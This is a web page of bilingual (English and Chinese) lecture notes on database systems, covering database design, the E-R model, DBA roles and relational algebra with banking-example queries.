<h3 id="note-db-lec1-steps-of-database-design">Steps of Database Design<a class="headerlink" href="#note-db-lec1-steps-of-database-design" title="Permanent link">&para;</a></h3>
<ul>
<li>
<p>Requirement analysis :What data, applications, and operations needed. </p>
</li>
<li>
<p>Conceptual database design :A high-level description of data, constraints using Entity-Relationship (E-R) model or a similar high level data model</p>
</li>
<li>Logical database design Convert the conceptual design into a DB schema. </li>
<li>Schema refinement-Normalization of relations: Check relational schema for redundancies and related anomalies. </li>
<li>Physical database design:Indexing, query, clustering, and database tuning. </li>
<li>Create and initialize the database &amp; Security design 
Load initial data, testing. Identify different user groups and their roles.  </li>
</ul>
<h3 id="note-db-lec1-entity-relationshipe-r-model">Entity-Relationship(E-R Model)<a class="headerlink" href="#note-db-lec1-entity-relationshipe-r-model" title="Permanent link">&para;</a></h3>
<p>E-R model of real world </p>
<ul>
<li>
<p>Entities (objects) E.g., customers, accounts, bank branch. Entities are described by a set of attributes. </p>
</li>
<li>
<p>Relationships between entities 
E.g., Account A-101 is held by customer Johnson. 
Relationship set depositor associates customers with accounts </p>
</li>
</ul>
<p>E-R Model is widely used for database design 
Database design in E-R model is usually converted to design in the relational model . E-R model was first proposed by Peter Chen. </p>
<div align=center>
<img src="../NOTE/DB/img/lec1-2.png" width=60%/>
</div>

<h2 id="note-db-lec1-users-and-administrators">Users and Administrators<a class="headerlink" href="#note-db-lec1-users-and-administrators" title="Permanent link">&para;</a></h2>
<h3 id="note-db-lec1-database-users">Database Users<a class="headerlink" href="#note-db-lec1-database-users" title="Permanent link">&para;</a></h3>
<p>Users are differentiated by the way they expect to interact with the system </p>
<p>Naive users – invoke one of the permanent application programs that have been written previously by a high level language. 
E.g., people accessing database over the web, bank tellers, clerical staff. </p>
<p>Application programmers – interact with system via SQL calls. </p>
<p>Sophisticated users – form requests in a database query language. 
E.g., Online Analytical Processing (OLAP), Data mining. </p>
<p>Specialized users – write specialized database applications that do not fit into the traditional data processing framework. 
E.g., CAD, Expert System (ES), KDB. </p>
<div align=center>
<img src="../NOTE/DB/img/lec1-3.png" width=60%/>
</div>

<h3 id="note-db-lec1-database-administrators">Database Administrators<a class="headerlink" href="#note-db-lec1-database-administrators" title="Permanent link">&para;</a></h3>
<p>Database administrator (DBA): A special user having central control over database and programs accessing those data.</p>
<ul>
<li>DBA has the highest privilege for the database. </li>
<li>DBA coordinates all the activities of the database system. </li>
<li>DBA controls all users authority to the database. </li>
<li>DBA has a good understanding of the enterprise’s information resources and requirements</li>
</ul>
<p>Database administrator's duties/functions include: </p>
<ul>
<li>Schema definition </li>
<li>Storage structure and access method definition </li>
<li>Schema and physical organization modification </li>
<li>Granting of authorization for data access 
Routing maintenance </li>
<li>Monitoring performance and responding to changes in requirements 
Security for the database (e.g. periodically backup database, recovery when failure) </li>
</ul>
<h2 id="note-db-lec1-transaction-management">Transaction Management<a class="headerlink" href="#note-db-lec1-transaction-management" title="Permanent link">&para;</a></h2>
<p>Concurrent use/access is important, but causes problems/conflict. </p>
<p>A transaction is a collection of operations that performs a single logical function in a database application. </p>
<p>Transaction requirements include atomicity, consistence, isolation, durability. </p>
<p>Transaction-management component ensures that the database remains in a consistent (or correct) state, although system failures (e.g., power failures and operating system crashes) and transaction failures. </p>
<p>Concurrency-control manager controls the interaction among the concurrent transactions. </p>
<h2 id="note-db-lec1-database-architecture">Database Architecture<a class="headerlink" href="#note-db-lec1-database-architecture" title="Permanent link">&para;</a></h2>
<h3 id="note-db-lec1-storage-manager">storage manager<a class="headerlink" href="#note-db-lec1-storage-manager" title="Permanent link">&para;</a></h3>
<p>Storage Manager is a program module that provides the interface between the low-level data stored in the database and the application programs and queries submitted to the system. </p>
<p>Storage Manager is responsible for the following tasks: </p>
<ul>
<li>Interaction with the file manager </li>
<li>Efficient storing, retrieving and updating of data </li>
</ul>
<p>Storage Manager includes </p>
<ul>
<li>Transaction manager </li>
<li>Authorization and integrity manger </li>
<li>File manager (interaction with the file system to process data files, data dictionary, and index files) </li>
<li>Buffer manager </li>
</ul>
<h3 id="note-db-lec1-query-processor">Query Processor<a class="headerlink" href="#note-db-lec1-query-processor" title="Permanent link">&para;</a></h3>
<p>Query Processor includes DDL interpreter, DML compiler, and query processing. </p>
<ul>
<li>Parsing and translation </li>
<li>Optimization </li>
<li>Evaluation </li>
</ul>
<div align=center>
<img src="../NOTE/DB/img/lec1-4.png" width=60%/>
</div></section><section class="print-page" id="note-db-lec2" heading-number="2.2.1.3"><h1 id="note-db-lec2-relational-model">Relational Model<a class="headerlink" href="#note-db-lec2-relational-model" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 1979 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 10 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 13 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 7 分钟</p>
</div>
<div class="admonition info">
<p class="admonition-title">relational model</p>
<ul>
<li>the relational model is vary simple and elegant</li>
<li>A relational database is a collection of relations (based on the relational model)</li>
<li>A relation is a table with columns and rows</li>
<li>relational model has two advantages:<ul>
<li>straight forward data representation</li>
<li>ease with which even complex queries can be expressed</li>
</ul>
</li>
<li>Owing to the great language SQL</li>
</ul>
</div>
<figure>
<img alt="" src="../NOTE/DB/img/lec2-1.png" width="400" />

<figcaption>Example</figcaption>
</figure>
<p>The difference between relationship and relation</p>
<ul>
<li>A relationship is an association among several entities</li>
<li>A relation is the mathematical concept, referred to as a table</li>
</ul>
<p>Entity set and relationship set &harr; real world</p>
<p>Relation---Table,tuple---row  &harr; machine world</p>
<h2 id="note-db-lec2-structure-of-relational-databases">Structure of Relational Databases<a class="headerlink" href="#note-db-lec2-structure-of-relational-databases" title="Permanent link">&para;</a></h2>
<h3 id="note-db-lec2-basic-structure">Basic Structure<a class="headerlink" href="#note-db-lec2-basic-structure" title="Permanent link">&para;</a></h3>
<p>Formally,given sets <span class="arithmatex">\(D_1,D_2,\ldots,D_n.(D_i|_{j=1,\ldots,k})\)</span></p>
<p>A relation <span class="arithmatex">\(r\)</span> is a subset of </p>
<div class="arithmatex">\[
    D_1\times D_2\times\ldots\times D_n
\]</div>
<p>aka a <strong>Cartesian product</strong> of a list of domains <span class="arithmatex">\(D_1,D_2,\ldots,D_n\)</span></p>
<p>Thus,a relation is a set of <span class="arithmatex">\(n\)</span>-tuples<span class="arithmatex">\((a_{1j},a_{2j},\ldots,a_{nj})\)</span></p>
<p>where <span class="arithmatex">\(a_{ij}\in D_i\)</span></p>
<p>即一个关系是一个元组的集合，每个元组有<span class="arithmatex">\(n\)</span>个属性，每个属性的值来自于一个域<span class="arithmatex">\(D_i\)</span></p>
<figure>
<img alt="" src="../NOTE/DB/img/lec2-2.png" width="400" />

<figcaption>Example</figcaption>
</figure>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<div class="language-python highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-db-lec2-__codelineno-0-1"></a><span class="n">If</span> 
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#note-db-lec2-__codelineno-0-2"></a>     <span class="n">customer</span><span class="o">-</span><span class="n">name</span> <span class="o">=</span> <span class="p">{</span><span class="n">Jones</span><span class="p">,</span> <span class="n">Smith</span><span class="p">,</span> <span class="n">Curry</span><span class="p">,</span> <span class="n">Lindsay</span><span class="p">}</span> 
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#note-db-lec2-__codelineno-0-3"></a>     <span class="n">customer</span><span class="o">-</span><span class="n">street</span> <span class="o">=</span> <span class="p">{</span><span class="n">Main</span><span class="p">,</span> <span class="n">North</span><span class="p">,</span> <span class="n">Park</span><span class="p">}</span> 
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#note-db-lec2-__codelineno-0-4"></a>     <span class="n">customer</span><span class="o">-</span><span class="n">city</span> <span class="o">=</span> <span class="p">{</span><span class="n">Harrison</span><span class="p">,</span> <span class="n">Rye</span><span class="p">,</span> <span class="n">Pittsfield</span><span class="p">}</span> 
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#note-db-lec2-__codelineno-0-5"></a><span class="n">Then</span> <span class="n">r</span> <span class="o">=</span> <span class="p">{(</span><span class="n">Jones</span><span class="p">,</span> <span class="n">Main</span><span class="p">,</span> <span class="n">Harrison</span><span class="p">),</span> 
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#note-db-lec2-__codelineno-0-6"></a>          <span class="p">(</span><span class="n">Smith</span><span class="p">,</span> <span class="n">North</span><span class="p">,</span> <span class="n">Rye</span><span class="p">),</span>
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#note-db-lec2-__codelineno-0-7"></a>          <span class="p">(</span><span class="n">Curry</span><span class="p">,</span> <span class="n">North</span><span class="p">,</span> <span class="n">Rye</span><span class="p">),</span>
</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#note-db-lec2-__codelineno-0-8"></a>          <span class="p">(</span><span class="n">Lindsay</span><span class="p">,</span> <span class="n">Park</span><span class="p">,</span> <span class="n">Pittsfield</span><span class="p">)}</span>
</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#note-db-lec2-__codelineno-0-9"></a>
</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#note-db-lec2-__codelineno-0-10"></a><span class="ow">is</span> <span class="n">a</span> <span class="n">relation</span> <span class="n">over</span> <span class="n">customer</span><span class="o">-</span><span class="n">name</span> <span class="n">x</span> <span class="n">customer</span><span class="o">-</span><span class="n">street</span> <span class="n">x</span> <span class="n">customer</span><span class="o">-</span><span class="n">city</span><span class="o">.</span>  <span class="p">(</span><span class="n">total</span> <span class="mi">36</span> <span class="n">tuples</span><span class="p">)</span> 
</span></code></pre></div>
</div>
<h3 id="note-db-lec2-attribute-types">Attribute Types<a class="headerlink" href="#note-db-lec2-attribute-types" title="Permanent link">&para;</a></h3>
<p>Each attribute of a relation has a name</p>
<p>THe set of allowed values for each attribute is called the <strong>domain</strong> of the attribute</p>
<p><strong>Attribute values</strong> are normally required to be atomic,i.e.,indivisible---1<sup>st</sup> normal form</p>
<ul>
<li>E,g multivalue attributes,composite attributes,derived attributes</li>
</ul>
<p>For every domain , there exists a special value called <strong>null</strong> </p>
<p>The null value causes complications(并发) in the definition of many operations. </p>
<h3 id="note-db-lec2-concepts-about-relation">Concepts about Relation<a class="headerlink" href="#note-db-lec2-concepts-about-relation" title="Permanent link">&para;</a></h3>
<p>A relation is concerned with the following concepts:</p>
<ul>
<li>relation schema:describes the structure of the relation</li>
</ul>
<p>EG.<code>Student-schema = (sid: string, name: string, sex: string, age: int, dept:  string)</code></p>
<ul>
<li>relation instance: corresponds to the snapshot(快照) of the data in the relation at a given instant in time. </li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#note-db-lec2-__codelineno-1-1"></a>Variable --- relation 
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#note-db-lec2-__codelineno-1-2"></a>Variable  type --- relation schema 
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#note-db-lec2-__codelineno-1-3"></a>Variable  value --- relation instance 
</span></code></pre></div>
<h3 id="note-db-lec2-relation-schema">Relation Schema<a class="headerlink" href="#note-db-lec2-relation-schema" title="Permanent link">&para;</a></h3>
<p>A <strong>relation schema</strong> is a blueprint or structure that defines the organization of data in a relational database. It specifies the <strong>tables</strong> (also called relations), the <strong>attributes</strong> (or columns), and the <strong>data types</strong> for each attribute. It serves as a way to describe the logical view of the data, but without the actual data being stored.</p>
<p>In a relational schema:
- Each <strong>relation (table)</strong> has a name.
- Each <strong>attribute (column)</strong> within the relation has a name and an associated data type (like <code>integer</code>, <code>varchar</code>, <code>date</code>, etc.).
- The <strong>keys</strong> for the relation are often defined, like primary keys, foreign keys, or unique keys.</p>
<p>For example, a relation schema for a <code>Student</code> table could look like this:</p>
<ul>
<li><strong>Student</strong>(<code>student_id: INT</code>, <code>first_name: VARCHAR(50)</code>, <code>last_name: VARCHAR(50)</code>, <code>dob: DATE</code>)</li>
</ul>
<p>Here:
- <code>Student</code> is the relation.(<code>student_id: INT</code>, <code>first_name: VARCHAR(50)</code>, <code>last_name: VARCHAR(50)</code>, <code>dob: DATE</code>)is the relation schema.
- <code>student_id</code>, <code>first_name</code>, <code>last_name</code>, and <code>dob</code> are the attributes.
- <code>INT</code>, <code>VARCHAR(50)</code>, and <code>DATE</code> are the data types for those attributes.</p>
<p>The relation schema helps in organizing the data in a relational database and ensures consistency, integrity, and the proper relationships between different tables.</p>
<h3 id="note-db-lec2-relation-instance">Relation Instance<a class="headerlink" href="#note-db-lec2-relation-instance" title="Permanent link">&para;</a></h3>
<p>The current values (i.e., relation instance) of a relation are specified  by a table. </p>
<p>An element t of r is a tuple, represented by a row in a table. </p>
<p>Let a tuple variable t be a tuple, then t[name] denotes the value of t on the name attribute. </p>
<figure>
<img alt="relation instance" src="../NOTE/DB/img/lec2-3.png" />

<figcaption>Example</figcaption>
</figure>
<p>The order of tuples is <em>irrelevant</em> (i.e., tuples may be stored in an arbitrary). </p>
<p>No duplicated tuples in a relation. Attribute values are atomic. </p>
<h3 id="note-db-lec2-key">Key<a class="headerlink" href="#note-db-lec2-key" title="Permanent link">&para;</a></h3>
<p>let <span class="arithmatex">\(K \subset R\)</span>,<span class="arithmatex">\(K\)</span> is a <em>superkey</em> (超码) of <span class="arithmatex">\(R\)</span> if values for <span class="arithmatex">\(K\)</span> are sufficient to identify a unique tuple of each possible relation <span class="arithmatex">\(r(R)\)</span></p>
<p>Eg,E.g., both {ID} and {ID, name} are superkeys of the relation instructor. </p>
<p><span class="arithmatex">\(K\)</span> is a <em>candidate key</em> (候选码) if K is minimal superkey. </p>
<p>E.g., both {ID} and {name} are candidate keys of the relation instructor.Since each of them is a superkey and no any subset. </p>
<p><span class="arithmatex">\(K\)</span> is a <em>primary key</em> (主码), if <span class="arithmatex">\(K\)</span> is a candidate key and is defined by user explicitly. </p>
<p>Primary key is usually marked by underline. </p>
<p><em>Foreign key</em> (外码) is a set of attributes in a relation that is a key of another relation.</p>
<p>Assume there exists relations <span class="arithmatex">\(r\)</span> and <span class="arithmatex">\(s\)</span>: <span class="arithmatex">\(r(A, B, C)\)</span>, <span class="arithmatex">\(s(B, D)\)</span>, we can say that attribute <span class="arithmatex">\(B\)</span> in relation <span class="arithmatex">\(r\)</span> is foreign key referencing <span class="arithmatex">\(s\)</span>, and <span class="arithmatex">\(r\)</span> is a referencing relation (参照关系), and <span class="arithmatex">\(s\)</span> is a referenced relation (被参照关系). </p>
<p><strong>参照关系中外码的值必须在被参照关系中实际存在, 或为null</strong></p>
<p>Primary key and foreign key are integrated constraints. 
即外键和主键是一体的约束，协同工作。</p>
<h2 id="note-db-lec2-fundamental-relational-algebra-operations">Fundamental relational-algebra operations<a class="headerlink" href="#note-db-lec2-fundamental-relational-algebra-operations" title="Permanent link">&para;</a></h2>
<h3 id="note-db-lec2-select">Select<a class="headerlink" href="#note-db-lec2-select" title="Permanent link">&para;</a></h3>
<p>Notation: <span class="arithmatex">\(\sigma_{p}(r)\)</span>,where <span class="arithmatex">\(r\)</span> is a relation and <span class="arithmatex">\(p\)</span> is a predicate.</p>
<p>Defined as:</p>
<div class="arithmatex">\[ \sigma_{p}(r) = \{t|t\in r \land p(t)\} \]</div>
<p>where <span class="arithmatex">\(p(t)\)</span> is a predicate that is true for a tuple <span class="arithmatex">\(t\)</span> if the tuple satisfies the condition specified by the predicate.And <span class="arithmatex">\(p\)</span> is a formula in propositional calculus consistion of terms connected by logical operators.</p>
<p>And each term is of the form :</p>
<div class="arithmatex">\[
    &lt;attribute&gt; &lt;operator&gt; &lt;constant&gt; or &lt;attribute&gt; &lt;operator&gt; &lt;attribute&gt;
\]</div>
<p>where <span class="arithmatex">\(&lt;operator&gt;\)</span> is one of the following: <span class="arithmatex">\(=, \neq, &lt;, \leq, &gt;, \geq\)</span></p>
<p>Eg. <span class="arithmatex">\(\sigma_{age&gt;20}(Student)\)</span></p>
<h3 id="note-db-lec2-project">Project(投影)<a class="headerlink" href="#note-db-lec2-project" title="Permanent link">&para;</a></h3>
<blockquote>
<p>如果说select是对行的操作，那么project就是对列的操作</p>
</blockquote>
<p>Notation: <span class="arithmatex">\(\pi_{A_1,A_2,\ldots,A_n}(r)\)</span>,where <span class="arithmatex">\(r\)</span> is a relation and <span class="arithmatex">\(A_1,A_2,\ldots,A_n\)</span> are attributes of <span class="arithmatex">\(r\)</span>.</p>
<p>The result of the operation is obtained by deleting columns that are not in the list of attributes.And duplicate rows will be removed</p>
<figure>
<img alt="" src="../NOTE/DB/img/lec2-4.png" width="500" />

<figcaption>Example</figcaption>
</figure>
<h3 id="note-db-lec2-union">Union<a class="headerlink" href="#note-db-lec2-union" title="Permanent link">&para;</a></h3>
<p>Notation: <span class="arithmatex">\(r \cup s\)</span>, where <span class="arithmatex">\(r\)</span> and <span class="arithmatex">\(s\)</span> are relations with the same schema.</p>
<p>Defined as:</p>
<div class="arithmatex">\[
    r \cup s = \{t|t\in r \lor t\in s\}
\]</div>
<p>Eg.</p>
<figure>
<img alt="" src="../NOTE/DB/img/lec2-5.png" width="500" />

<figcaption>Example</figcaption>
</figure>
<h3 id="note-db-lec2-set-difference">set difference<a class="headerlink" href="#note-db-lec2-set-difference" title="Permanent link">&para;</a></h3>
<p>Notation: <span class="arithmatex">\(r - s\)</span>, where <span class="arithmatex">\(r\)</span> and <span class="arithmatex">\(s\)</span> are relations with the same schema.</p>
<p>Defined as:</p>
<div class="arithmatex">\[
    r - s = \{t|t\in r \land t\notin s\}
\]</div>
<p>set difference must be taken between two compatible relations.</p>
<ul>
<li><span class="arithmatex">\(r\)</span> and <span class="arithmatex">\(s\)</span> must have the same arity</li>
<li>Attribute domains must be compatible</li>
</ul>
<p>Eg.</p>
<figure>
<img alt="" src="../NOTE/DB/img/lec2-6.png" width="500" />

<figcaption>Example</figcaption>
</figure>
<h3 id="note-db-lec2-cartesian-product">Cartesian product<a class="headerlink" href="#note-db-lec2-cartesian-product" title="Permanent link">&para;</a></h3>
<p>Notation:<span class="arithmatex">\(r \times s\)</span></p>
<p>Defined as:</p>
<div class="arithmatex">\[
    r \times s \{ \{ t q \} |t\in r \land q\in s\}
\]</div>
<ul>
<li>
<p>Assume that attributes of <span class="arithmatex">\(r\)</span> and <span class="arithmatex">\(s\)</span> are disjoint (i.e.,R \cap S = \emptyset)</p>
</li>
<li>
<p>If attributes of <span class="arithmatex">\(r(R)\)</span> and <span class="arithmatex">\(s(S)\)</span> are not disjoint, then renaming for attributes must be used.</p>
</li>
</ul>
<p>Eg.</p>
<figure>
<img alt="" src="../NOTE/DB/img/lec2-7.png" width="500" />

<figcaption>Example</figcaption>
</figure>
<h3 id="note-db-lec2-rename">Rename<a class="headerlink" href="#note-db-lec2-rename" title="Permanent link">&para;</a></h3>
<p>Allow us to rename the attributes of a relation include the name of the relation itself.</p>
<p>used as</p>
<div class="arithmatex">\[
    \rho_{x(A_1,A_2,\ldots,A_n)}(r)    
\]</div>
<p>which means rename the relation <span class="arithmatex">\(r\)</span> as <span class="arithmatex">\(x\)</span> and rename the attributes' names of the relation  as <span class="arithmatex">\(A_1,A_2,\ldots,A_n\)</span></p>
<h3 id="note-db-lec2-exercise">Exercise<a class="headerlink" href="#note-db-lec2-exercise" title="Permanent link">&para;</a></h3>
<p>For a Banking example,we have following relations:</p>
<ul>
<li>branch(branch-name, branch-city, assets) </li>
<li>customer(customer-name, customer-street, customer-city) </li>
<li>account(account-number, branch-name, balance) </li>
<li>loan(loan-number, branch-name, amount) </li>
<li>depositor(customer-name, account-number) </li>
<li>borrower(customer-name, loan-number) </li>
</ul>
<figure>
<img alt="" src="../NOTE/DB/img/lec2-8.png" width="500" />

<figcaption>instance</figcaption>
</figure>
<figure>
<img alt="" src="../NOTE/DB/img/lec2-9.png" width="500" />

<figcaption>instance</figcaption>
</figure>
<ul>
<li>Find the names of all customers who have an loan at the Perryridge branch.</li>
</ul>
<p>we have following queries:</p>
<div class="arithmatex">\[
    \Pi_{customer-name}(\sigma_{branch-name='Perryridge'}(\sigma_{borrower.loan-number=loan.loan-number}(borrower \times loan)))
\]</div>
<p>and </p>
<div class="arithmatex">\[
    \Pi_{customer-name}(\sigma_{borrower.loan-number=loan.loan-number}(borrower \times \sigma_{branch-name='Perryridge'}(loan)))
\]</div>
<p>query 2 is better because it reduced the size of Cartesian product.</p>
<ul>
<li>Find the names of all customers who have loans at the Perryridge branch but do not have an account at any branch of the bank. </li>
</ul>
<p>Just use the result above and do a set difference operation.</p>
<div class="arithmatex">\[
    result- \Pi_{customer-name}(depositor)
\]</div>
<ul>
<li>
<p>Find the largest account balance (i.e., self-comparison)</p>
<blockquote>
<p>这个例子很好的揭示了rename操作是必要的</p>
</blockquote>
</li>
<li>
<p>Step 1： Rename account relation as <span class="arithmatex">\(d\)</span></p>
</li>
<li>Step 2: Find the relation including all balances except the largest one</li>
<li>Finally, find the largest balance in the relation</li>
</ul>
<div class="arithmatex">\[
    \Pi_{balance}(account)-\Pi_{account.balance}(\sigma_{account.balance &lt; d.balance}(account \times \rho_d(account)))
\]</div>
<p>例如一个(4x1)表其中含有1,2,3,4;那么Cartesian product之后会得到(16x2)的表，上面减号右边的表达式会取出例如[1,2],[1,3],[1,4];[2,3]...[3,4]这样的表，然后再投影到account balance上就得到了不包含最大值的所有项，然后进行set difference就OK了</p>
<h2 id="note-db-lec2-additional-relation-algebra-operations">Additional Relation-algebra Operations<a class="headerlink" href="#note-db-lec2-additional-relation-algebra-operations" title="Permanent link">&para;</a></h2>
<p>Although using the six fundamental operations is enough for any query requirements,the additional operations simplify common queries.</p>
<p>Remember,the additional operations do not add any power to the relational algebra.</p>
<h3 id="note-db-lec2-set-intersection">Set Intersection<a class="headerlink" href="#note-db-lec2-set-intersection" title="Permanent link">&para;</a></h3>
<p>Notation: <span class="arithmatex">\(r \cap s\)</span></p>
<p>Defined as:</p>
<div class="arithmatex">\[
    r \cap s = \{ t | t \in r \land t \in s\}
\]</div>
<p>requirements are same as set difference since </p>
<div class="arithmatex">\[
    r \cap s = r-(r-s)
\]</div>
<figure>
<img alt="" src="../NOTE/DB/img/lec2-10.png" width="500" />

<figcaption>instance</figcaption>
</figure>
<h3 id="note-db-lec2-natural-join">Natural join<a class="headerlink" href="#note-db-lec2-natural-join" title="Permanent link">&para;</a></h3>
<p>Notation: <span class="arithmatex">\(r \bowtie s\)</span></p>
<p>Example: R=(A,B,C,D),S=(B,D,E)</p>
<ul>
<li>
<p>Result schema of the natural-join of <span class="arithmatex">\(r\)</span> and <span class="arithmatex">\(s\)</span> = (A, B, C, D, E) </p>
</li>
<li>
<p><span class="arithmatex">\(r \bowtie s= \Pi_{r.A,r.B,r.C,r.D,s.E}(\sigma_{r.B=s.B \land r.D=s.D}(r \times s))\)</span></p>
</li>
</ul>
<figure>
<img alt="" src="../NOTE/DB/img/lec2-11.png" width="500" />

<figcaption>instance</figcaption>
</figure>
<h4 id="note-db-lec2-theta-join-operation">Theta Join Operation<a class="headerlink" href="#note-db-lec2-theta-join-operation" title="Permanent link">&para;</a></h4>
<p>Notation: <span class="arithmatex">\(r \bowtie_\theta s\)</span> where <span class="arithmatex">\(\theta\)</span> is the predicate on attributes in the schema</p>
<p>Theta join:  <span class="arithmatex">\(r \bowtie_\theta s= \sigma_theta(r \times s)\)</span></p>
<h3 id="note-db-lec2-division">Division<a class="headerlink" href="#note-db-lec2-division" title="Permanent link">&para;</a></h3>
<p>Division operation suited to queries that include the phase "for all"</p>
<p>与算数一样，除法就是乘法的逆运算</p>
<p>Notation: <span class="arithmatex">\(r \div s\)</span></p>
<p>assume R and S  are relation schemas for relation <span class="arithmatex">\(r\)</span> and <span class="arithmatex">\(s\)</span></p>
<div class="arithmatex">\[
    r \div s = t, t \in \Pi_{R-S} \land  \forall u \in s ,tu 
    \in r
\]</div>
<p>即剩下的<span class="arithmatex">\(t\)</span>必须在原relation中与s中所有元素都有元组的组合</p>
<p>Eg</p>
<figure>
<img alt="" src="../NOTE/DB/img/lec2-12.png" width="500" />

<figcaption>instance</figcaption>
</figure>
<ul>
<li>Find all customers who have an account from at least the “Downtown” and the “Uptown” branches. </li>
</ul>
<div class="arithmatex">\[
\Pi_{customer-name,branch-name}(depositor \bowtie account) \div \rho_{temp}(branch-name)(\{('downtown'),('uptown')\})
\]</div>
<h3 id="note-db-lec2-assignment">Assignment<a class="headerlink" href="#note-db-lec2-assignment" title="Permanent link">&para;</a></h3>
<p>The assignment operation (<span class="arithmatex">\(\leftarrow\)</span>) provides a convenient way to express complex queries. </p>
<h2 id="note-db-lec2-extended-relational-algebra-operations">Extended Relational-Algebra Operations<a class="headerlink" href="#note-db-lec2-extended-relational-algebra-operations" title="Permanent link">&para;</a></h2>
<h3 id="note-db-lec2-generalized-projection">Generalized Projection<a class="headerlink" href="#note-db-lec2-generalized-projection" title="Permanent link">&para;</a></h3>
<p>Extends the projection operation by allowing arithmetic functions to be used in the projection list. </p>
<div class="arithmatex">\[
\Pi_{F_1,F_2,\ldots,F_n}(E)
\]</div>
<p>where <span class="arithmatex">\(E\)</span> is any relational-algebra expression,and each of <span class="arithmatex">\(F_1,F_2,\ldots,F_n\)</span> are arithmetic expressions involving constants and attruibutes in the schema of E</p>
<p>Eg.
Given a relation credit-info(customer-name, limit, credit_balance),  find how much more each person can spend:  </p>
<div class="arithmatex">\[
    \Pi_{customer-name,limit-credit\_balanced}(Credit-info)
\]</div>
<h3 id="note-db-lec2-aggregate-functions">Aggregate Functions<a class="headerlink" href="#note-db-lec2-aggregate-functions" title="Permanent link">&para;</a></h3>
<p>Aggregation function takes a collection of values and returns a single value as a result. </p>
<ul>
<li>avg: average value </li>
<li>min: minimum value </li>
<li>max: maximum value </li>
<li>sum: sum of values </li>
<li>count: number of values </li>
</ul>
<div class="arithmatex">\[
    _{G_1,\ldots,G_n}g_{F_1(A_1),\ldots,F_n(A_n)}(E)
\]</div>
<p>where <span class="arithmatex">\(E\)</span> is any relational-algebra expression, G1, G2 …, Gn is a list of attributes on which to group (can be empty), each Fi is an  aggregate function, and each Ai is an attribute name. </p>
<p>即可以分组进行</p>
<figure>
<img alt="" src="../NOTE/DB/img/lec2-13.png" width="500" />

<figcaption>instance</figcaption>
</figure>
<h2 id="note-db-lec2-modification-of-the-database">Modification of the Database<a class="headerlink" href="#note-db-lec2-modification-of-the-database" title="Permanent link">&para;</a></h2>
<h3 id="note-db-lec2-deletion">Deletion<a class="headerlink" href="#note-db-lec2-deletion" title="Permanent link">&para;</a></h3>
<p>A delete request is expressed similarly to a query, except instead of displaying tuples to the user, the selected tuples are removed from the database. </p>
<p>It can delete only whole tuples; cannot delete values on some  particular attributes.  </p>
<p>A deletion is expressed in relational algebra by: </p>
<div class="arithmatex">\[
    r \leftarrow r-E
\]</div>
<p>where r is a relation and E is a relational algebra query. </p>
<h3 id="note-db-lec2-inserting">Inserting<a class="headerlink" href="#note-db-lec2-inserting" title="Permanent link">&para;</a></h3>
<p>To insert data into a relation, we either: 
- Specify a tuple to be inserted. 
- Write a query whose result is a set of tuples to be inserted. </p>
